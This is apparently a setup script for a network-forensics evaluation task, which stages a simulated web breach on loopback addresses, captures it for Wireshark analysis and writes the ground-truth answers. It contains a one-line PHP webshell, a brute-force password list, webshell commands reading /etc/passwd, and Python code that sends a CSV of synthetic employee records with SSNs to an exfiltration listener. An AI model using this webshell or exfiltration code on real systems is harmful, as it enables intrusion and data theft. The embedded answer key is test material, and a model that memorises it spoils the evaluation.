#!/bin/bash
set -e

echo "=== Setting up Web Application Breach Investigation task ==="

# Source shared utilities
source /workspace/scripts/task_utils.sh

# ── 1. Clean previous state ──────────────────────────────────────────────────
rm -f /home/ga/Documents/incident_report.txt 2>/dev/null || true
rm -f /tmp/task_result.json 2>/dev/null || true
rm -rf /var/lib/wireshark_ground_truth 2>/dev/null || true
mkdir -p /var/lib/wireshark_ground_truth
chmod 700 /var/lib/wireshark_ground_truth

# Record task start time AFTER cleaning old outputs
date +%s > /tmp/task_start_time.txt

# ── 2. Configuration ─────────────────────────────────────────────────────────
CAPTURE_DIR="/home/ga/Documents/captures"
CAPTURE_FILE="$CAPTURE_DIR/incident_capture.pcapng"
mkdir -p "$CAPTURE_DIR"
rm -f "$CAPTURE_FILE" 2>/dev/null || true

LEGIT_USER_IP="10.13.37.10"
WEBSERVER_IP="10.13.37.20"
ATTACKER_IP="10.13.37.50"
EXFIL_SERVER_IP="10.13.37.100"
EXFIL_PORT=9443
WEB_PORT=8080
VALID_USER="admin"
VALID_PASS='S3cur3P@ss2024'
WEBSHELL_NAME="cmd.php"

# Brute-force credential list (20 wrong attempts)
WRONG_PASSWORDS=(
    "password" "123456" "admin" "12345678" "qwerty"
    "password1" "admin123" "letmein" "welcome" "monkey"
    "1234567890" "password123" "iloveyou" "sunshine" "princess"
    "football" "charlie" "access" "shadow" "master"
)

# Webshell commands (in execution order)
WEBSHELL_COMMANDS=("id" "uname -a" "cat /etc/passwd" "ls -la /opt/data")

# ── 3. Create virtual IPs on loopback ────────────────────────────────────────
echo "Setting up virtual network..."
ip addr add $LEGIT_USER_IP/32 dev lo 2>/dev/null || true
ip addr add $WEBSERVER_IP/32 dev lo 2>/dev/null || true
ip addr add $ATTACKER_IP/32 dev lo 2>/dev/null || true
ip addr add $EXFIL_SERVER_IP/32 dev lo 2>/dev/null || true
sleep 1

# ── 4. Generate exfiltration data (deterministic) ────────────────────────────
echo "Generating exfiltration payload..."
python3 << 'PYEOF'
import csv, io, random, string

random.seed(42)

header = ["employee_id", "name", "email", "department", "salary", "ssn"]
depts = ["Engineering", "Sales", "Marketing", "Finance", "HR", "Operations"]

buf = io.StringIO()
writer = csv.writer(buf)
writer.writerow(header)
for i in range(200):
    first = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))).capitalize()
    last = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 12))).capitalize()
    writer.writerow([
        f"EMP{i+1:04d}",
        f"{first} {last}",
        f"{first.lower()}.{last.lower()}@company.com",
        random.choice(depts),
        random.randint(55000, 180000),
        f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"
    ])

with open("/tmp/exfil_data.csv", "w") as f:
    f.write(buf.getvalue())
PYEOF

# Create a small PHP webshell file for upload
echo '<?php system($_POST["cmd"]); ?>' > /tmp/$WEBSHELL_NAME

# ── 5. Start web application server ──────────────────────────────────────────
echo "Starting web application server..."
cat > /tmp/webapp_server.py << 'PYEOF'
import http.server
import socketserver
import urllib.parse
import sys
import os

BIND_IP = sys.argv[1]
BIND_PORT = int(sys.argv[2])
VALID_USER = sys.argv[3]
VALID_PASS = sys.argv[4]

CMD_RESPONSES = {
    "id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
    "uname -a": "Linux webapp-prod 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 GNU/Linux\n",
    "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\nappuser:x:1000:1000:App User:/home/appuser:/bin/bash\n",
    "ls -la /opt/data": "total 56\ndrwxr-xr-x 2 root root  4096 Jan 15 09:30 .\ndrwxr-xr-x 4 root root  4096 Jan 15 09:25 ..\n-rw-r--r-- 1 root root 48256 Jan 15 09:30 employee_records.csv\n-rw-r--r-- 1 root root  1024 Jan 12 14:22 config.ini\n"
}

class AppHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><head><title>Corporate Portal</title></head><body><h1>Welcome to Corporate Portal</h1><p>Internal use only.</p></body></html>")
        elif parsed.path in ("/about", "/status", "/docs", "/contact"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            body = f"<html><body><h1>{parsed.path.strip('/')}</h1><p>Page content.</p></body></html>"
            self.wfile.write(body.encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        if self.path == "/admin/login":
            params = urllib.parse.parse_qs(body.decode("utf-8", errors="ignore"))
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            if username == VALID_USER and password == VALID_PASS:
                self.send_response(302)
                self.send_header("Location", "/admin/dashboard")
                self.end_headers()
            else:
                self.send_response(401)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Invalid credentials")

        elif self.path == "/admin/upload":
            # Accept multipart upload — we don't need to parse it
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"File uploaded successfully to /uploads/")

        elif self.path.endswith(("/cmd.php", "/shell.php")):
            params = urllib.parse.parse_qs(body.decode("utf-8", errors="ignore"))
            cmd = params.get("cmd", [""])[0]
            output = CMD_RESPONSES.get(cmd, f"sh: 1: {cmd}: not found\n")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(output.encode())

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress access logs

httpd = http.server.HTTPServer((BIND_IP, BIND_PORT), AppHandler)
httpd.serve_forever()
PYEOF

python3 /tmp/webapp_server.py "$WEBSERVER_IP" "$WEB_PORT" "$VALID_USER" "$VALID_PASS" &
HTTP_PID=$!
sleep 2

# Verify server is up
if ! curl -s --interface "$LEGIT_USER_IP" "http://$WEBSERVER_IP:$WEB_PORT/" > /dev/null 2>&1; then
    echo "WARNING: Web server not responding, waiting..."
    sleep 3
fi

# ── 6. Start exfiltration listener ───────────────────────────────────────────
echo "Starting exfil listener..."
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('$EXFIL_SERVER_IP', $EXFIL_PORT))
s.listen(1)
conn, addr = s.accept()
while True:
    data = conn.recv(4096)
    if not data:
        break
conn.close()
s.close()
" &
EXFIL_PID=$!
sleep 1

# ── 7. Start packet capture ─────────────────────────────────────────────────
echo "Starting packet capture..."
tcpdump -i lo -w "$CAPTURE_FILE" "net 10.13.37.0/24" -s 0 &
TCPDUMP_PID=$!
sleep 2

# ── 8. Generate legitimate user traffic (background noise) ──────────────────
echo "Generating legitimate user traffic..."
curl -s --interface "$LEGIT_USER_IP" "http://$WEBSERVER_IP:$WEB_PORT/" > /dev/null 2>&1 || true
sleep 0.3
curl -s --interface "$LEGIT_USER_IP" "http://$WEBSERVER_IP:$WEB_PORT/about" > /dev/null 2>&1 || true
sleep 0.3
curl -s --interface "$LEGIT_USER_IP" "http://$WEBSERVER_IP:$WEB_PORT/status" > /dev/null 2>&1 || true
sleep 0.5

# ── 9. Attack Phase A: Brute-force login ─────────────────────────────────────
echo "Generating brute-force attack traffic..."
for wrong_pass in "${WRONG_PASSWORDS[@]}"; do
    curl -s --interface "$ATTACKER_IP" \
        -X POST -d "username=$VALID_USER&password=$wrong_pass" \
        "http://$WEBSERVER_IP:$WEB_PORT/admin/login" > /dev/null 2>&1 || true
    sleep 0.1
done
sleep 0.5

# ── 10. Attack Phase B: Successful login ─────────────────────────────────────
echo "Generating successful login..."
curl -s --interface "$ATTACKER_IP" \
    -X POST -d "username=$VALID_USER&password=$VALID_PASS" \
    "http://$WEBSERVER_IP:$WEB_PORT/admin/login" > /dev/null 2>&1 || true
sleep 0.3

# ── 11. Attack Phase C: Webshell upload ──────────────────────────────────────
echo "Generating webshell upload..."
curl -s --interface "$ATTACKER_IP" \
    -X POST -F "file=@/tmp/$WEBSHELL_NAME;filename=$WEBSHELL_NAME" \
    "http://$WEBSERVER_IP:$WEB_PORT/admin/upload" > /dev/null 2>&1 || true
sleep 0.3

# ── 12. Attack Phase D: Command execution via webshell ───────────────────────
echo "Generating webshell command traffic..."
for cmd in "${WEBSHELL_COMMANDS[@]}"; do
    curl -s --interface "$ATTACKER_IP" \
        -X POST --data-urlencode "cmd=$cmd" \
        "http://$WEBSERVER_IP:$WEB_PORT/uploads/$WEBSHELL_NAME" > /dev/null 2>&1 || true
    sleep 0.2
done
sleep 0.5

# ── 13. Attack Phase E: Data exfiltration ────────────────────────────────────
echo "Generating exfiltration traffic..."
python3 -c "
import socket
data = open('/tmp/exfil_data.csv', 'rb').read()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('$ATTACKER_IP', 0))
s.connect(('$EXFIL_SERVER_IP', $EXFIL_PORT))
s.sendall(data)
s.close()
" 2>/dev/null || true
sleep 1

# ── 14. More legitimate traffic (noise at end of capture) ────────────────────
echo "Generating trailing legitimate traffic..."
curl -s --interface "$LEGIT_USER_IP" "http://$WEBSERVER_IP:$WEB_PORT/docs" > /dev/null 2>&1 || true
sleep 0.3
curl -s --interface "$LEGIT_USER_IP" "http://$WEBSERVER_IP:$WEB_PORT/contact" > /dev/null 2>&1 || true
sleep 1

# ── 15. Stop capture and servers ─────────────────────────────────────────────
echo "Stopping capture..."
kill "$TCPDUMP_PID" 2>/dev/null || true
wait "$TCPDUMP_PID" 2>/dev/null || true
sleep 1

kill "$HTTP_PID" 2>/dev/null || true
kill "$EXFIL_PID" 2>/dev/null || true
wait "$HTTP_PID" 2>/dev/null || true
wait "$EXFIL_PID" 2>/dev/null || true

# Clean up virtual IPs
ip addr del $LEGIT_USER_IP/32 dev lo 2>/dev/null || true
ip addr del $WEBSERVER_IP/32 dev lo 2>/dev/null || true
ip addr del $ATTACKER_IP/32 dev lo 2>/dev/null || true
ip addr del $EXFIL_SERVER_IP/32 dev lo 2>/dev/null || true

# Set file permissions
chown ga:ga "$CAPTURE_FILE"
chmod 644 "$CAPTURE_FILE"

# ── 16. Compute ground truth ─────────────────────────────────────────────────
echo "Computing ground truth..."
GT_DIR="/var/lib/wireshark_ground_truth"

# Verify capture has packets
TOTAL_PACKETS=$(tshark -r "$CAPTURE_FILE" 2>/dev/null | wc -l)
echo "Total packets captured: $TOTAL_PACKETS"

if [ "$TOTAL_PACKETS" -lt 20 ]; then
    echo "ERROR: Capture too small ($TOTAL_PACKETS packets). Setup may have failed."
fi

# ATTACKER_IP and WEBSERVER_IP are known from setup
echo "$ATTACKER_IP" > "$GT_DIR/attacker_ip.txt"
echo "$WEBSERVER_IP" > "$GT_DIR/webserver_ip.txt"
echo "$EXFIL_SERVER_IP" > "$GT_DIR/exfil_server_ip.txt"

# FAILED_LOGINS: count of 401 responses from the web server
FAILED_COUNT=$(tshark -r "$CAPTURE_FILE" \
    -Y "http.response.code == 401 and ip.src == $WEBSERVER_IP" \
    2>/dev/null | wc -l)
echo "$FAILED_COUNT" > "$GT_DIR/failed_logins.txt"

# VALID_CREDENTIALS
echo "${VALID_USER}:${VALID_PASS}" > "$GT_DIR/valid_credentials.txt"

# WEBSHELL_FILENAME
echo "$WEBSHELL_NAME" > "$GT_DIR/webshell_filename.txt"

# COMMANDS_EXECUTED (comma-separated, in order)
CMDS_CSV=$(IFS=,; echo "${WEBSHELL_COMMANDS[*]}")
echo "$CMDS_CSV" > "$GT_DIR/commands_executed.txt"

# EXFIL_BYTES: total TCP payload bytes from attacker to exfil server
EXFIL_BYTES=$(tshark -r "$CAPTURE_FILE" \
    -Y "ip.src == $ATTACKER_IP and ip.dst == $EXFIL_SERVER_IP and tcp.dstport == $EXFIL_PORT and tcp.len > 0" \
    -T fields -e tcp.len 2>/dev/null | \
    awk '{s+=$1}END{print s+0}')
echo "$EXFIL_BYTES" > "$GT_DIR/exfil_bytes.txt"

# Lock down ground truth
chmod -R 700 "$GT_DIR"

echo "Ground truth computed:"
echo "  ATTACKER_IP: $ATTACKER_IP"
echo "  WEBSERVER_IP: $WEBSERVER_IP"
echo "  FAILED_LOGINS: $FAILED_COUNT"
echo "  VALID_CREDENTIALS: ${VALID_USER}:****"
echo "  WEBSHELL_FILENAME: $WEBSHELL_NAME"
echo "  COMMANDS_EXECUTED: $CMDS_CSV"
echo "  EXFIL_SERVER_IP: $EXFIL_SERVER_IP"
echo "  EXFIL_BYTES: $EXFIL_BYTES"

# ── 17. Launch Wireshark ─────────────────────────────────────────────────────
echo "Launching Wireshark..."
pkill -f wireshark 2>/dev/null || true
sleep 1

su - ga -c "DISPLAY=:1 wireshark '$CAPTURE_FILE' > /dev/null 2>&1 &"

# Wait for Wireshark window
for i in {1..30}; do
    if DISPLAY=:1 wmctrl -l 2>/dev/null | grep -i "Wireshark"; then
        echo "Wireshark window detected"
        break
    fi
    sleep 1
done

# Maximize and focus
DISPLAY=:1 wmctrl -r "Wireshark" -b add,maximized_vert,maximized_horz 2>/dev/null || true
DISPLAY=:1 wmctrl -a "Wireshark" 2>/dev/null || true

# Dismiss any startup dialogs
sleep 2
DISPLAY=:1 xdotool key Escape 2>/dev/null || true

# Initial screenshot
take_screenshot /tmp/task_initial.png

echo "=== Setup complete ==="
